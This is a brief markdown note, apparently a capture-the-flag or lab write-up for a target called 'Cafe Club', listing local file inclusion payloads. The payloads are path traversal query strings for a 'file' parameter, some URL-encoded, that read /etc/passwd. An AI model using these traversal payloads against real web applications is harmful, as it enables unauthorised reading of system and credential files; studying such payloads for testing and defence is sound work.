# Cafe Club (01-March-2026) => Local File Inclusion.
> Here there a Multiple ways to do it.

- File Inclusion from Current File System.
```bash
?file=/uploads/image.png
?file=/uploads/../../../../../../../../etc/passwd
```
- File Inclusion from Root File system
```bash
?file=/../../../../../../../../etc/passwd

?file=../../../../../../../../etc/passwd
```
- File Inclusion Using URL Encoding
```bash
?file=%2Fuploads%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```
